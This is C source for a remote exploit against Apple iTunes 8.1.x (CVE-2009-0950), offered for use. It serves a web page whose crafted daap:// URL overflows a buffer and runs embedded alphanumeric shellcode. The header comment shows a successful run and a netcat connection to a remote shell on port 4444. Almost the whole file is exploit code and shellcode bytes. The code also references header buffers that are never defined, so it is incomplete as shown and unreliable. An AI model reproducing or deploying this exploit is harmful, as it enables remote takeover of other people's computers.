
/* iTunes-CVE09-s36.c
 *
 * Apple iTunes 8.1.x (daap) Buffer overflow remote exploit (CVE-2009-0950)
 *
 * Coded By :
 *       .:: [ Simo36 ] ::.
 *
 *       Contact : Overflows@hotmail.com<mailto:Overflows@hotmail.com>
 *                 His0k4.hlm@gmail.com<mailto:His0k4.hlm@gmail.com>
 *
 * Home :          www.sec-r1z.com<http://www.sec-r1z.com>
 *
 * Tested on : Win XP SP/SP3 Frensh , Win2k pro SP4 english
 *
 * Thanks To : Ryujin & Stack & r1z
 *
 * finally I want to thanks mr ryujin for printable shellcode and jump back .
 *
 *----------------------------------------------------------
 * C:\Documents and Settings\Administrateur\Bureau\exploit>iTunes-CVE09-s36.exe
 *
 * [+] Apple iTunes 8.1.x Buffer overflow remote exploit CVE-2009-0950
 *
 * [+] By :                Simo36 & His0k4 ( Overflows@hotmail.com<mailto:Overflows@hotmail.com> )
 *
 * [+] Home :               www.sec-r1z.com<http://www.sec-r1z.com>
 * [+] Listen on port 80
 *
 * [+] Connection accepted from 127.0.0.1:1097
 *
 * [x] Sendin welcome information....Done
 *
 * [+] sending the evil packet ...[+] Done !
 *
 * [+] check port 4444 with netcat
 *
 * [+] Connection Closed
 *
 *
 *
 *----------------------------------------------------------------
 * C:\Documents and Settings\Administrateur\Bureau\exploit>nc -v 196.217.232.130 4444
 * sweet-9fc9abcd4 [196.217.232.130] 4444 (?) open
 * Windows XP Sweet 5.1 [SP3 v5.1.2600]
 *(C) Copyright 1985-2001 Microsoft Corp.
 *
 * C:\Program Files\Mozilla Firefox>
 *
 *
 *
 *
 *
 *
 * Note : This vulnerability can't be exploited with simply return address Because
 *        it is affected with GS Flag .
 *
 *
 */
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#ifdef WIN32
#include <windows.h>
#include <winsock2.h>
#pragma comment(lib, "ws2_32")
#else
#include <sys/types.h>
#include <sys/socket.h>
#define SOCKET int
#define closesocket(sock2) close(sock2)
#endif
#define Max_BUFF 2037
 
char header1[]=
"<html>\n"
"  <head><title>iTunes Remote Exploit</title>\n"
"  \n"
"  </head>\n"
"<body onload='main();'>\n"
"<html>\n"
"<head>\n"
"  <title></title>\n"
"</head>\n"
"<body style='color: rgb(0, 0, 0);' onload='main();'\n"
" alink='#ee0000' link='#0000ee' vlink='#551a8b'>\n"
"<p align='center'><b>Apple iTunes 8.1.1.10 (daap)\n"
"BOF remote exploit&nbsp;</b></p>\n"
"<p align='center'><a\n"
" href='http://dvlabs.tippingpoint.com/advisory/TPTI-09-03'><b>\n"
"CVE-2009-0950</b></a>\n"
"</p>\n"
"<p align='center'><span style='font-weight: bold;'>Exploited\n"
"by : Simo36 &nbsp;{ Overflows [AT] Hotmail [DOT] com }</span></p>\n"
"<p align='center'><span style='font-weight: bold;'></span></p>\n"
"<p align='center'><b>www.sec-r1z.com</b></p>\n"
"<p align='center'>based on the code found by Matteo\n"
"Memelli&nbsp; <br>\n"
"</p>\n"
"<h2 align='center'><b><u>This exploit works if\n"
"opened from Firefox only!</u></b>\n"
"</h2>\n"
"<p align='center'>\n"
"After exploitation iTunes crashes, you need to kill it from TaskManager\n"
"<br>\n"
"have fun!</p>\n"
"<p align='center'><br>\n"
"</p>\n"
"<p></p>\n"
"</body>\n"
"</html>\n";
 
// printable shellcode via EDX
unsigned char shellcode[]=
             "VVVVVVVVVVVVVVVVV7RYjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIOqhDahIoS0"
             "5QnaJLS1uQVaeQcdcm2ePESuW5susuPEsuilazJKRmixHykOkOKOCPLKPlUtu"
             "tnkRegLLKSLfepx31zOlK2o7hlKqOEpWqZK3ylKwDLKeQHndqo0j9llOt9P3D"
             "uW9Q8J4MWqkrJKkDukPTWTq845M5LKQOq4VajKcVLKTLPKlKQOUL6ajK336LL"
             "KMY0lWTwle1O3TqiK2DLKaSFPLKQPVllK0p7lLmlK3pUXQNU8LNbnvnjL0PkO"
             "8V2Fv3U61xds02U8RWpsVRqO649on0PhjkZMYlekpPKOKfsoMYkUpfna8mgxV"
             "b65RJuRIoHPPhHYFiL5lmBwkOzvpSPSV3F3bsg3BsSsScIohPsVRHR1sl2Fcc"
             "k9M1nuphOT6zppIWrwKO8VcZ6ppQv5KO8PBHmtNMvNm9QGKON6aCqEkOZpbHZ"
             "EbiNfRiSgioiFRpf40TseiohPLSu8KWD9kvPyf7YoxVqEKOxPu6sZpd3VSX1s"
             "0mK98ecZRpv9Q9ZlMYkWqzpDmYxbTqO0KCoZKNaRVMkN3r6LJ3NmpzFXNKNKL"
             "ksX0rkNls5FkOrURdioXVSk67PRPQsapQCZgqbq0QSesaKOxPaxNMZyEUjnCc"
             "KOn6qzKOkOtwKOJpNk67YlMSKtcTyozvrryozp0hXoZnYp1p0SkOXVKOHPA";
 
// ascii printable jump code (alpha2)
char jump_code[]=    "\x55\x59\x43\x43\x43\x43\x43\x43\x49\x49\x49\x49\x49\x49\x49\x49"
                     "\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41"
                     "\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41"
                     "\x42\x75\x4a\x49\x5a\x49\x45\x35\x6a\x5a\x4b\x4f\x4b\x4f\x41";
// pop EDX from Stack and Incrasing it
char align_stack[]= "\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61"
                    "\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61"
                    "\x61\x61\x61\x61\x61\x54\x5a\x42\x42\x42\x42\x42\x42\x56\x56\x56\x56\x56\x56\x56"//
                    "\x56\x56\x56";
int main(void){
    struct sockaddr_in server,client;
    FILE *p;
    SOCKET sock1,sock2;
    WSADATA wsa;
    int res;
    char sdinfo[]="200\n\r";
    char szRecvBuff[0x100];
    char url2[Max_BUFF];
    char url1[210];
    char payload[7000];
    int i=0;
system("cls");
printf("\n[+] Apple iTunes 8.1.x Buffer overflow remote exploit CVE-2009-0950\n\n");
printf("[+] By :  \t\tSimo36 & His0k4 ( Overflows@hotmail.com<mailto:Overflows@hotmail.com> ) \n\n");
printf("[+] Home :\t\t www.sec-r1z.com\n<http://www.sec-r1z.com\n>");
if(WSAStartup(MAKEWORD(1 ,1),&wsa) !=0){
                         printf("[-] WSAStartup error:%d\n", WSAGetLastError());
                         return;
                         }
sock1 = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
server.sin_family = AF_INET;
server.sin_port= htons(80);
server.sin_addr.s_addr=0;
res = bind(sock1,(struct sockaddr *)&server ,sizeof(server));
res = listen(sock1, 100);
printf("[+] Listen on port 80 \n\n");
while(1){
         res = sizeof(client);
         sock2 = accept(sock1, (struct sockaddr *)&client, &res);
         printf("[+] Connection accepted from %s:%d\n\n",
         inet_ntoa(client.sin_addr), ntohs(client.sin_port));
         printf("[x] Sendin welcome information....");
         if(send(sock2,sdinfo,strlen(sdinfo),0) !=-1){
                 Sleep(1000);
                 printf("Done\n");
                 res = recv(sock2, szRecvBuff, sizeof(szRecvBuff), 0);
                 res=recv(sock2,sdinfo,strlen(sdinfo),0);
                 szRecvBuff[res-1] = '\x0';
/**** ITMS URL ****/
memset(url1,0x41,strlen(url1));
strcpy(&url1[0],"itms://:");
memset(&url1[8],0x42,200);
strcpy(&url1[208],"/");
// Second url
memset(url2,0x42,strlen(url2));
strcpy(&url2[0],"daap://:");
// some padd
memset(&url2[8],0x41,425);
// align with push esp and pop edx
strcpy(&url2[433],align_stack);
// Shellcode Ready !
strcpy(&url2[496],shellcode);
memset(&url2[1226],0x41,570);
strcpy(&url2[1796],"\x61\x45\x45\x45");
strcpy(&url2[1800],"\x2a\x5e\x21\x67");// Thanks Riyujin for this
strcpy(&url2[1804],"DEEEEEEE");
strcpy(&url2[1812],jump_code);
memset(&url2[1875],0x43,161);
strcpy(&url2[2036],"C");
// building exploit
memset(payload,0x41,7000);
strcpy(&payload[0],header1);
// evil packet is ready now :)
strcpy(&payload[strlen(header1)],url1);
strcpy(&payload[strlen(header1)+strlen(url1)],header2);
strcpy(&payload[strlen(header1)+strlen(url1)+strlen(header2)],url2);
strcpy(&payload[strlen(header1)+strlen(url1)+strlen(header2)+strlen(url2)],header3);
strcpy(&payload[strlen(header1)
             +strlen(url1)+strlen(header2)+strlen(url2)+strlen(header3)],header4);
    printf("\n[+] sending the evil packet ...");
 
    if(send(sock2,payload,strlen(payload),0) !=-1){
        res=recv(sock2,payload,strlen(payload),0);
        sleep(100);
        closesocket(sock2);
        printf("[+] Done ! \n\n");
        printf("[+] check port 4444 with netcat \n\n");
        printf("[+] Connection Closed\n\n");
 
                     }else printf ("[-] Error on sending payload !");
             }else   printf("Error\n");
         exit(0);
}
WSACleanup();
return 0x0;
}

